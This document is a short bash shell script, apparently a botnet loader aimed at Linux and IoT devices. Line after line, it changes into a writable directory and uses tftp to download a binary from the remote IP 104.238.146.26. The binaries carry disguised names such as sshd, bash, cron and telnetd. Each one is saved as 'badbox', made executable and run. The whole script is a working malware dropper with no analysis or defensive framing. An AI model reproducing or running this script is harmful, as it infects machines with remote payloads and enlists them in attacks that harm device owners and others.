#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 104.238.146.26;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 104.238.146.26;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 104.238.146.26;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 104.238.146.26;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 104.238.146.26;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 104.238.146.26;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 104.238.146.26;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 104.238.146.26;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 104.238.146.26;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 104.238.146.26;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 104.238.146.26;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 104.238.146.26;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 104.238.146.26;cat telnetd >badbox;chmod +x *;./badbox
